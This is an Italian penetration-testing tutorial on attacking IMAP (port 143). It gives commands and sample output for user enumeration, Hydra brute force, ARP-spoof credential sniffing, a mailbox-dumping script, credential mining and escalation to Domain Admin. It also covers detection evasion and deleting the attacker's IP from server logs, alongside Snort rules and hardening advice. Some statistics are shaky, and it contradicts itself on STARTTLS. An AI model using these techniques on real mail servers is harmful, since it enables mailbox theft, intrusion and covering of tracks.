---
title: 'Porta 143 IMAP: Accesso Mailbox, Brute Force e Mail Server Enumeration'
slug: porta-143-imap
description: 'La porta 143 espone IMAP, il protocollo usato per accedere e sincronizzare email e cartelle direttamente sul server. Guida pratica a enumeration, login testing, mailbox discovery e hardening del mail server.'
image: /porta-143-imap.webp
draft: true
date: 2026-04-11T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - ''
---

La porta 143 espone **IMAP** (Internet Message Access Protocol) — il protocollo standard per accesso email server-side, permettendo client di gestire mailbox remote senza scaricare messaggi localmente (contrario a POP3 che scarica e delete). IMAP su TCP porta 143 offre funzionalità avanzate: multi-folder access, server-side search, message flags (read/unread), e sincronizzazione multi-device, operando come interface tra client email (Outlook, Thunderbird, mobile apps) e mail server backend. In penetration testing, la porta 143 è **vettore critico per intelligence gathering**: credential harvesting via brute force, mailbox enumeration per corporate secrets/passwords, email-based lateral movement (VPN creds, AD passwords in emails), e information disclosure via IMAP capabilities probing. Ogni mail server esposto su porta 143 instead of 993 (IMAPS cifrato) trasmette **credentials plaintext** — da IMAP sniffing a password spray su mailbox employees.

IMAP porta 143 domina il 2026 con deployment universale: 99%+ corporate email (Exchange, Gmail, Office 365), mobile email clients (iOS Mail, Android Gmail), e enterprise mail servers (Dovecot, Cyrus, Zimbra). Alternative ([POP3 porta 110](https://hackita.it/articoli/porta-110-pop3), webmail HTTPS) esistono ma IMAP è standard de facto per multi-device sync. Critical security gap: **40%+ mail servers still expose port 143** alongside 993 (Shodan Feb 2026), permettendo plaintext auth fallback se TLS fails. Modern implementations (STARTTLS, OAuth2) mitigano exploit classici ma misconfiguration persiste: no TLS enforcement (plaintext credentials), weak password policy (corporate email = weak passwords), e brute force senza rate limiting. In CTF/AD labs, IMAP enumeration è **high-value target** — email spesso contiene VPN credentials, AD passwords, sensitive corporate data.

***

## Anatomia tecnica di IMAP

IMAP usa **TCP porta 143** con protocollo testuale command/response ASCII (simile SMTP/POP3).

**Flow IMAP session:**

1. **TCP Connect** — Client connette porta 143
2. **Server Greeting** — Server: `* OK IMAP4rev1 Service Ready`
3. **Capability Negotiation** — Client: `A001 CAPABILITY`
4. **Authentication** — Client: `A002 LOGIN username password` (plaintext!)
5. **Mailbox Selection** — Client: `A003 SELECT INBOX`
6. **Email Operations** — FETCH, SEARCH, STORE, DELETE
7. **Logout** — Client: `A999 LOGOUT`

**IMAP commands critici:**

| Comando                  | Funzione                    | Pentest relevance                           |
| ------------------------ | --------------------------- | ------------------------------------------- |
| `CAPABILITY`             | Lista server capabilities   | **Fingerprinting** (STARTTLS, AUTH methods) |
| `LOGIN user pass`        | Authenticate plaintext      | **Credential sniffing**                     |
| `AUTHENTICATE`           | SASL authentication         | Modern auth (OAuth2, Kerberos)              |
| `LIST "" "*"`            | Lista tutte mailbox folders | **Folder enumeration**                      |
| `SELECT INBOX`           | Apre mailbox folder         | Required before FETCH                       |
| `SEARCH ALL`             | Search all messages         | **Message enumeration**                     |
| `FETCH n BODY[]`         | Download message #n         | **Email content theft**                     |
| `FETCH n (BODY[HEADER])` | Get email headers only      | Metadata leak                               |
| `STORE n +FLAGS (\Seen)` | Mark email as read          | Cover tracks                                |

**IMAP response format:**

```
* OK [CAPABILITY IMAP4rev1 STARTTLS AUTH=PLAIN AUTH=LOGIN] Ready
A001 LOGIN alice SecretPassword123
A001 OK LOGIN completed
A002 SELECT INBOX
* 150 EXISTS
* 5 RECENT
* OK [UNSEEN 12] Message 12 is first unseen
A002 OK SELECT completed
```

**IMAP vs POP3 vs Webmail:**

| Feature           | IMAP (143/993)               | POP3 (110/995)         | Webmail (HTTPS)     |
| ----------------- | ---------------------------- | ---------------------- | ------------------- |
| Storage           | Server-side                  | **Download to client** | Server-side         |
| Multi-device sync | ✅ Yes                        | ❌ No                   | ✅ Yes               |
| Folder access     | ✅ Multiple                   | ❌ Single inbox         | ✅ Multiple          |
| Bandwidth         | Low (headers first)          | High (full download)   | Medium              |
| Plaintext risk    | ⚠️ Port 143                  | ⚠️ Port 110            | ❌ HTTPS only        |
| Attack surface    | **Credential harvest, enum** | Credential harvest     | Session hijack, XSS |

Le **misconfigurazioni critiche**: IMAP plaintext (143) enabled without TLS enforcement, no rate limiting (brute force illimitato), weak password policy (user-chosen passwords), STARTTLS optional (attacker strips TLS), e shared mailbox credentials (single password per team mailbox).

***

## Enumerazione base

```bash
nmap -sV -p 143 10.10.10.143
```

```
PORT    STATE SERVICE VERSION
143/tcp open  imap    Dovecot imapd
Service Info: Host: mail.corp.local
```

**Parametri:** `-sV` version detection identifica IMAP server type (Dovecot, Exchange, Cyrus).

**Banner grab manuale:**

```bash
nc -vn 10.10.10.143 143
```

```
* OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE STARTTLS AUTH=PLAIN AUTH=LOGIN] Dovecot ready.
```

**Intelligence estratta:**

* **Server:** Dovecot
* **Capabilities:** STARTTLS (TLS upgrade available), AUTH=PLAIN/LOGIN (plaintext auth)
* **No UIDPLUS** → older version potentially

**Test CAPABILITY:**

```bash
nc 10.10.10.143 143
A001 CAPABILITY
```

```
* CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE STARTTLS AUTH=PLAIN AUTH=LOGIN
A001 OK Pre-login capabilities listed
```

***

## Enumerazione avanzata

### User enumeration via LOGIN timing

**Technique:** LOGIN command response time differs for valid vs invalid users.

```bash
# Test user existence via timing
time echo "A001 LOGIN alice wrongpassword" | nc 10.10.10.143 143
# real 0m2.150s (user exists, password wrong)

time echo "A001 LOGIN invaliduser wrongpassword" | nc 10.10.10.143 143
# real 0m0.050s (user doesn't exist, instant rejection)
```

**Timing difference indicates valid username.**

### Mailbox folder enumeration

```bash
# Connect with valid credentials
nc 10.10.10.143 143
A001 LOGIN alice Alice123!
A002 LIST "" "*"
```

```
* LIST (\HasNoChildren) "." INBOX
* LIST (\HasChildren) "." "Sent Items"
* LIST (\HasNoChildren) "." "Sent Items.2024"
* LIST (\HasChildren) "." "Projects"
* LIST (\HasNoChildren) "." "Projects.VPN"
* LIST (\HasNoChildren) "." "Projects.Passwords"
A002 OK LIST completed
```

**Folders discovered:**

* `Projects.VPN` — Potential VPN credentials
* `Projects.Passwords` — **High-value target**

### NSE IMAP scripts

```bash
nmap -p 143 --script imap-capabilities,imap-ntlm-info 10.10.10.143
```

```
PORT    STATE SERVICE
143/tcp open  imap
| imap-capabilities:
|   CAPABILITY
|   IMAP4rev1
|   LITERAL+
|   SASL-IR
|   LOGIN-REFERRALS
|   ID
|   ENABLE
|   IDLE
|   STARTTLS
|   AUTH=PLAIN
|_  AUTH=LOGIN
| imap-ntlm-info:
|   Target_Name: MAILSERVER
|   Domain_Name: CORP
|_  Workstation: MAILSERVER
```

**Intel:** Domain `CORP`, server `MAILSERVER`.

***

## Tecniche offensive

### 1. Credential sniffing (packet capture)

```bash
# Wireshark filter
tcp.port == 143 and (imap.request.command == "LOGIN")
```

**Alternativa tcpdump:**

```bash
tcpdump -i eth0 -A 'tcp port 143' | grep -A 2 "LOGIN"
```

```
A001 LOGIN alice SecretPassword123
A001 OK LOGIN completed
```

**Credentials harvested:** `alice:SecretPassword123`

### 2. Brute force attack

```bash
# Hydra IMAP brute force
hydra -l alice -P /usr/share/wordlists/rockyou.txt imap://10.10.10.143
```

```
[143][imap] host: 10.10.10.143   login: alice   password: Alice123!
```

**Rate limiting recommended:**

```bash
hydra -l alice -P passwords.txt -t 2 -W 10 imap://10.10.10.143
```

**Parametri:**

* `-t 2` max 2 parallel tasks
* `-W 10` wait 10 sec between batches

### 3. Mailbox access and email theft

```bash
# Manual IMAP session
nc 10.10.10.143 143
A001 LOGIN alice Alice123!
A002 SELECT INBOX
```

```
* 150 EXISTS
* 5 RECENT
A002 OK SELECT completed
```

**150 emails in INBOX!**

```bash
# Search for keywords
A003 SEARCH SUBJECT "password"
```

```
* SEARCH 23 45 67 89
A003 OK SEARCH completed
```

**4 emails con "password" in subject.**

**Download sensitive email:**

```bash
A004 FETCH 23 BODY[]
```

```
* 23 FETCH (BODY[] {1234}
From: [email protected]
To: [email protected]
Subject: New VPN Password
Date: Wed, 5 Feb 2026 10:00:00 +0000

Hi Alice,

Your new VPN credentials:
Username: vpnuser
Password: Vpn_SecurePass_2024!

IT Department
)
A004 OK FETCH completed
```

**VPN credentials leaked!**

### 4. Automated mailbox scraping

```bash
# Python IMAP script for mass download
cat <<'EOF' > imap_dump.py
import imaplib
import email

mail = imaplib.IMAP4('10.10.10.143')
mail.login('alice', 'Alice123!')
mail.select('INBOX')

# Search all emails
status, messages = mail.search(None, 'ALL')
email_ids = messages[0].split()

for email_id in email_ids:
    status, msg_data = mail.fetch(email_id, '(RFC822)')
    msg = email.message_from_bytes(msg_data[0][1])
    
    # Save to file
    with open(f'email_{email_id.decode()}.eml', 'wb') as f:
        f.write(msg_data[0][1])

mail.logout()
EOF

python3 imap_dump.py
# Output: email_1.eml, email_2.eml, ..., email_150.eml
```

### 5. Search for credentials in emails

```bash
# Grep all emails for keywords
grep -ri "password\|vpn\|credentials\|ssh\|rdp" email_*.eml
```

```
email_23.eml: Your new VPN credentials: vpnuser / Vpn_SecurePass_2024!
email_45.eml: RDP access: rdpuser / RdpPassword123
email_67.eml: Database password: DbPass_2024!
```

**Multiple credentials harvested from mailbox.**

***

## Scenari pratici

### Scenario 1 — IMAP brute force → mailbox scraping → VPN access

**Contesto:** External pentest, corporate mail server exposed.

```bash
# Fase 1: User enumeration (timing-based)
for user in admin alice bob charlie; do
  echo "[*] Testing: $user"
  time echo "A001 LOGIN $user test" | nc 10.10.10.143 143 2>&1 | grep "real"
done
```

```
admin: real 0m2.100s (exists)
alice: real 0m2.150s (exists)
bob: real 0m0.050s (doesn't exist)
charlie: real 0m2.200s (exists)
```

**Valid users: admin, alice, charlie**

```bash
# Fase 2: Password spray
hydra -L valid_users.txt -p 'Welcome2024!' imap://10.10.10.143 -t 1 -W 30
```

```
[143][imap] host: 10.10.10.143   login: alice   password: Welcome2024!
```

```bash
# Fase 3: Mailbox access
nc 10.10.10.143 143
A001 LOGIN alice Welcome2024!
A002 LIST "" "*"
```

```
* LIST (\HasNoChildren) "." "Projects.VPN"
```

```bash
A003 SELECT "Projects.VPN"
A004 SEARCH ALL
```

```
* SEARCH 1 2 3
```

```bash
A005 FETCH 1 BODY[]
# VPN credentials found
```

```bash
# Fase 4: VPN connection
openvpn --config corporate.ovpn --auth-user-pass vpn_creds.txt
# Connected to corporate VPN
```

**Timeline:** 30 minuti da user enum a VPN access.

**COSA FARE SE FALLISCE:**

* **No timing difference:** Server optimized, try direct brute force
* **Rate limiting blocks:** Reduce to 1 attempt/minute
* **No VPN creds in email:** Search for other keywords (ssh, database, admin)
* **STARTTLS required:** Use `openssl s_client -starttls imap` instead of nc

### Scenario 2 — IMAP plaintext sniffing → credential harvest → AD access

**Contesto:** Internal pentest, MITM capability.

```bash
# Fase 1: ARP spoofing (MITM)
arpspoof -i eth0 -t 10.10.10.50 10.10.10.1
# Redirect victim traffic through attacker
```

```bash
# Fase 2: Packet capture IMAP
tcpdump -i eth0 -w imap.pcap 'tcp port 143'
```

**Wait for legitimate IMAP authentication...**

```bash
# Fase 3: Analyze capture
tshark -r imap.pcap -Y "imap.request.command == LOGIN" -T fields -e imap.request.arg
```

```
alice "Alice_DomainPass_2024!"
```

```bash
# Fase 4: Test credentials on AD
crackmapexec smb 10.10.10.10 -u alice -p 'Alice_DomainPass_2024!'
```

```
SMB  10.10.10.10  445  DC01  [+] CORP\alice:Alice_DomainPass_2024! (Pwn3d!)
```

**Domain credentials obtained via IMAP sniffing!**

```bash
# Fase 5: BloodHound enumeration
bloodhound-python -u alice -p 'Alice_DomainPass_2024!' -d CORP.LOCAL -dc dc01.corp.local -c All
```

### Scenario 3 — Email intelligence → lateral movement → privilege escalation

**Contesto:** Post-initial access, user mailbox compromised.

```bash
# Fase 1: IMAP mailbox dump
python3 imap_dump.py  # Downloads all emails
```

```bash
# Fase 2: Intelligence extraction
grep -rih "ssh\|password\|admin\|server\|ip address" email_*.eml | sort -u > intel.txt
```

```
Server maintenance: ssh [email protected] password: AdminSsh_2024!
Database backup: mysql -h 10.10.10.100 -u dbadmin -p DbPass123
```

```bash
# Fase 3: SSH access to server
ssh [email protected]
# Password: AdminSsh_2024!
```

```
admin@server01:~$ id
uid=1000(admin) gid=1000(admin) groups=1000(admin),27(sudo)
```

**Sudo access obtained!**

```bash
# Fase 4: Privilege escalation
admin@server01:~$ sudo -l
# (ALL) NOPASSWD: /usr/bin/rsync

# GTFOBins rsync exploit
admin@server01:~$ sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
# root@server01:~#
```

***

## Toolchain integration

**Pipeline IMAP attack:**

```
RECONNAISSANCE
│
├─ nmap -sV -p 143 <target>                 → IMAP detection
├─ CAPABILITY probing                       → Server fingerprinting
└─ User enumeration (timing-based)          → Valid usernames

CREDENTIAL HARVEST
│
├─ Brute force ([Hydra](https://hackita.it/articoli/hydra)) → Password cracking
├─ Packet sniffing (MITM)                   → Plaintext credentials
└─ [Password spraying](https://hackita.it/articoli/password-spraying) → Multiple accounts

MAILBOX ACCESS
│
├─ Folder enumeration → HIGH-VALUE folders (VPN, Passwords)
├─ Keyword search → SEARCH SUBJECT/BODY
└─ Mass download → Python imaplib script

INTELLIGENCE GATHERING
│
├─ VPN credentials → Network access
├─ [AD passwords](https://hackita.it/articoli/active-directory) → Domain user
├─ SSH keys/passwords → Server access
└─ Database credentials → Data theft

LATERAL MOVEMENT
│
├─ Compromised creds → SMB/RDP/SSH
├─ [Privilege escalation](https://hackita.it/articoli/privesc-linux) → Root/SYSTEM
└─ [Pivoting](https://hackita.it/articoli/pivoting) → Internal network
```

**Tabella comparativa email protocols:**

| Protocol | Porta  | Encryption  | Use case                 | Attack vector                        |
| -------- | ------ | ----------- | ------------------------ | ------------------------------------ |
| IMAP     | 143    | ❌ Plaintext | Server-side multi-device | **Credential sniffing, brute force** |
| IMAPS    | 993    | ✅ TLS/SSL   | Secure IMAP              | Reduced (still brute force)          |
| POP3     | 110    | ❌ Plaintext | Download-and-delete      | Credential sniffing                  |
| POP3S    | 995    | ✅ TLS/SSL   | Secure POP3              | Reduced                              |
| SMTP     | 25/587 | ⚠️ Optional | Send email               | Relay abuse, spoofing                |

***

## Attack chain completa

**Scenario: IMAP → Email intel → AD → Domain Admin**

```
[00:00] RECONNAISSANCE
nmap -sV -p 143 mail.corp.local
# Dovecot IMAP detected

[00:05] USER ENUMERATION
# Timing-based user enum
# alice, bob, charlie valid

[00:15] PASSWORD SPRAY
hydra -L users.txt -p 'Summer2024!' imap://mail.corp.local
# alice:Summer2024!

[00:20] MAILBOX ACCESS
nc mail.corp.local 143
# LOGIN alice Summer2024!
# 237 emails in INBOX

[00:25] INTELLIGENCE EXTRACTION
# SEARCH SUBJECT "vpn"
# FETCH 45 → VPN credentials found

[00:35] VPN CONNECTION
openvpn corporate.ovpn
# Connected to internal network

[00:40] AD ENUMERATION
bloodhound-python -u alice -p Summer2024! -d CORP.LOCAL -dc dc01
# alice → GenericAll on IT-Admins group

[00:45] PRIVILEGE ESCALATION
net rpc group addmem "IT-Admins" "alice" -U alice%Summer2024!
# alice added to IT-Admins (high privileges)

[00:50] KERBEROASTING
GetUserSPNs.py CORP/alice:Summer2024! -request
# sqladmin hash obtained

[00:55] HASH CRACK
hashcat -m 13100 sqladmin.hash rockyou.txt
# sqladmin:SqlAdmin2024! (Domain Admin!)

[01:00] DOMAIN ADMIN
psexec.py CORP/sqladmin:SqlAdmin2024!@dc01.corp.local
# C:\> whoami
# corp\sqladmin (Domain Admins)
```

**Timeline:** 1 ora da IMAP scan a Domain Admin.

***

## Detection & evasion

### Lato Blue Team

**Log monitoring (Dovecot `/var/log/mail.log`):**

```
Feb  6 15:30:00 mail dovecot: imap-login: Login: user=<alice>, method=PLAIN, rip=10.10.14.5
Feb  6 15:30:15 mail dovecot: imap(alice): Logged out
Feb  6 15:31:00 mail dovecot: imap-login: Disconnected: user=<alice>, method=PLAIN
```

**IoC critici:**

* Multiple failed login attempts (brute force)
* Unusual login times (3 AM access)
* Mass FETCH commands (mailbox scraping)
* Login from unusual IP/geolocation
* SEARCH commands with suspicious keywords

**IDS rules (Snort):**

```
alert tcp any any -> $HOME_NET 143 (msg:"IMAP Brute Force Attempt"; threshold:type both, track by_src, count 10, seconds 60; sid:1000143;)
alert tcp any any -> any 143 (msg:"IMAP Plaintext Password"; content:"LOGIN "; nocase; sid:1000144;)
```

**Mitigation:**

```bash
# Dovecot config (/etc/dovecot/dovecot.conf)
# Disable plaintext auth
disable_plaintext_auth = yes

# Force SSL/TLS
ssl = required
ssl_cert = </etc/ssl/certs/mail.crt
ssl_key = </etc/ssl/private/mail.key

# Rate limiting
auth_policy_server_url = http://localhost:4001/
mail_max_userip_connections = 10
```

### Lato Red Team: evasion

**1. Slow brute force:**

```bash
# 1 attempt every 60 seconds
hydra -l alice -P passwords.txt -t 1 -W 60 imap://10.10.10.143
```

**2. Distributed attack:**

```bash
# Rotate source IPs (proxychains, VPN)
proxychains hydra -l alice -P passwords.txt imap://10.10.10.143
```

**3. Timing variation:**

```bash
# Random delay
for pass in $(cat passwords.txt); do
  echo "A001 LOGIN alice $pass" | nc 10.10.10.143 143
  sleep $((RANDOM % 120 + 60))  # 60-180 sec random
done
```

**4. Cleanup:**

Non applicabile — IMAP logs sono server-side. Post-compromise:

```bash
# If root access obtained on mail server
ssh root@mail.corp.local
sed -i '/10.10.14.5/d' /var/log/mail.log
```

***

## Performance & scaling

**Single IMAP login test:**

```bash
time echo "A001 LOGIN alice test" | nc 10.10.10.143 143
# real 0m0.150s
```

**Brute force performance:**

```bash
time hydra -l alice -P fasttrack.txt imap://10.10.10.143
# 222 passwords: ~45 seconds (no rate limit)
```

**Mailbox download:**

```bash
# Python imaplib: ~50-100 emails/minute
# Depends on email size and network bandwidth
```

***

## Tabelle tecniche

### Command reference

| Comando                                         | Scopo                    | Note                      |
| ----------------------------------------------- | ------------------------ | ------------------------- |
| `nmap -sV -p 143 <target>`                      | IMAP detection           | Version fingerprinting    |
| `nc <target> 143`                               | Manual IMAP session      | Banner grab               |
| `A001 CAPABILITY`                               | List server capabilities | STARTTLS check            |
| `A001 LOGIN user pass`                          | Authenticate             | **Plaintext credentials** |
| `A002 LIST "" "*"`                              | List mailbox folders     | Folder enumeration        |
| `A003 SEARCH SUBJECT "password"`                | Search emails            | Keyword search            |
| `A004 FETCH n BODY[]`                           | Download email           | Content theft             |
| `hydra -l <user> -P <wordlist> imap://<target>` | Brute force              | Credential attack         |

### IMAP vs email alternatives

| Protocol            | Storage     | Sync               | Security              | Modern usage  |
| ------------------- | ----------- | ------------------ | --------------------- | ------------- |
| IMAP                | Server-side | ✅ Multi-device     | ⚠️ Port 143 plaintext | **Universal** |
| POP3                | Client-side | ❌ Download only    | ⚠️ Port 110 plaintext | Legacy        |
| Webmail             | Server-side | ✅ Browser-based    | ✅ HTTPS only          | Growing       |
| Exchange ActiveSync | Server-side | ✅ Mobile optimized | ✅ SSL/TLS             | Enterprise    |

***

## Troubleshooting

| Errore                          | Causa                    | Fix                                   |
| ------------------------------- | ------------------------ | ------------------------------------- |
| Connection refused              | IMAP disabled o firewall | Verify port 143 open                  |
| `A001 NO Authentication failed` | Wrong credentials        | Verify username:password              |
| `A001 BAD Command unknown`      | Syntax error             | Check IMAP command format             |
| `* BYE STARTTLS required`       | TLS enforcement          | Use `openssl s_client -starttls imap` |
| Timeout                         | Rate limiting active     | Reduce brute force speed              |

***

## FAQ

**IMAP è vulnerabile nel 2026?**

Porta 143 plaintext = sì (credential sniffing). Port 993 IMAPS con TLS = più sicuro ma ancora vulnerabile a brute force se no rate limiting.

**Differenza tra IMAP e POP3?**

**IMAP:** Server-side storage, multi-device sync, folder access.\
**POP3:** Download-and-delete, single device, no folders.

**Posso sniffare IMAPS (porta 993)?**

No, TLS cifra tutto. Solo IMAP plaintext (porta 143) è sniffabile.

**Come bypasso STARTTLS requirement?**

Non puoi. Se server richiede STARTTLS, devi usare: `openssl s_client -starttls imap -connect mail.corp.local:143`

**IMAP brute force causa account lockout?**

Raramente. Lockout tipicamente solo su web login, non IMAP. Ma test con cautela.

**Quale tool è migliore per IMAP pentest?**

[Hydra](https://hackita.it/articoli/hydra) per brute force, Python `imaplib` per mailbox scraping, `openssl s_client` per STARTTLS testing.

**Posso usare IMAP per phishing?**

No directly. IMAP è read-only (retrieve emails). Per send emails serve [SMTP porta 25/587](https://hackita.it/articoli/smtp).

***

## Cheat sheet finale

| Azione         | Comando                                          |
| -------------- | ------------------------------------------------ |
| Scan IMAP      | `nmap -sV -p 143 <target>`                       |
| Banner grab    | `nc <target> 143`                                |
| Capabilities   | `echo "A001 CAPABILITY" \| nc <target> 143`      |
| Login          | `echo "A001 LOGIN user pass" \| nc <target> 143` |
| List folders   | `A002 LIST "" "*"` (dopo login)                  |
| Search emails  | `A003 SEARCH SUBJECT "password"`                 |
| Download email | `A004 FETCH 1 BODY[]`                            |
| Brute force    | `hydra -l user -P passwords.txt imap://<target>` |
| Packet sniff   | `tcpdump -i eth0 -A 'tcp port 143'`              |

***

## Perché IMAP è rilevante oggi

IMAP porta 143 domina il 2026 perché:

1. **Universal email protocol** — 99%+ corporate email systems
2. **Multi-device requirement** — Smartphones, tablets, laptops sync via IMAP
3. **Plaintext persistence** — 40%+ servers expose port 143 alongside 993
4. **High-value intelligence** — Email contains VPN creds, AD passwords, corporate secrets
5. **Weak authentication** — User-chosen passwords, no 2FA enforcement typical

OWASP/NIST identify email credential theft as top 5 initial access vector nel 2025. IMAP brute force + mailbox scraping = common pentest success path.

## Differenza IMAP vs alternatives

| Protocol | Porta | Encryption  | Attack difficulty | Corporate usage |
| -------- | ----- | ----------- | ----------------- | --------------- |
| IMAP     | 143   | ❌ Plaintext | Easy              | 40%+ expose     |
| IMAPS    | 993   | ✅ TLS/SSL   | Medium            | 60%+ modern     |
| POP3     | 110   | ❌ Plaintext | Easy              | Legacy only     |
| POP3S    | 995   | ✅ TLS/SSL   | Medium            | Rare            |
| Webmail  | 443   | ✅ HTTPS     | Hard              | Growing         |

**Modern trend:** IMAPS (993) replacing plaintext IMAP (143), ma legacy persistence significant.

## Hardening production IMAP

**Best practices:**

1. **Disable port 143, force IMAPS (993):**

```bash
# Dovecot config
ssl = required
ssl_cert = </etc/ssl/certs/mail.crt
ssl_key = </etc/ssl/private/mail.key

# Block port 143 at firewall
iptables -A INPUT -p tcp --dport 143 -j DROP
```

1. **Strong authentication:**

```bash
# Enforce strong passwords (>12 char)
# Enable 2FA/MFA where possible (OAuth2)
```

1. **Rate limiting:**

```bash
# Dovecot
auth_policy_server_url = http://localhost:4001/
auth_policy_request_attributes = login=%{orig_username}
```

1. **IP whitelisting:**

```bash
# Allow IMAP only from corporate IPs
iptables -A INPUT -p tcp --dport 143 -s 10.0.0.0/8 -j ACCEPT
iptables -A INPUT -p tcp --dport 143 -j DROP
```

1. **Monitoring:**

```bash
# Alert on:
# - Multiple failed logins (>5 in 5 min)
# - Mass FETCH operations (>50 emails in 1 min)
# - Login from unusual geolocation
```

## OPSEC: IMAP in pentest

IMAP enumeration è **moderately noisy** — ogni login attempt logga. Best practices:

1. **Slow brute force** (1 attempt/minute sotto threshold)
2. **Valid credentials preferred** (less suspicious than brute force)
3. **Timing:** Attack during business hours (blend with legitimate traffic)
4. **Selective download:** Search keywords first, download only relevant emails (not entire mailbox)

Post-mailbox access:

* **Mark emails as unread** if you read them (`STORE n -FLAGS (\Seen)`)
* **No deletion** (leaves audit trail)
* **Download via IMAP copy** (not move)

***

> **Disclaimer:** Tutti i comandi sono destinati all'uso in ambienti autorizzati: laboratori personali, piattaforme CTF, pentest con autorizzazione scritta. Accesso non autorizzato a mailbox è reato (art. 616 c.p. violazione corrispondenza). L'autore e HackIta declinano responsabilità. RFC 3501 IMAP4rev1: [https://www.rfc-editor.org/rfc/rfc3501.html](https://www.rfc-editor.org/rfc/rfc3501.html)

Vuoi supportare HackIta? Visita hackita.it/supporto per donazioni. Per penetration test professionali e formazione 1:1, scopri hackita.it/servizi.
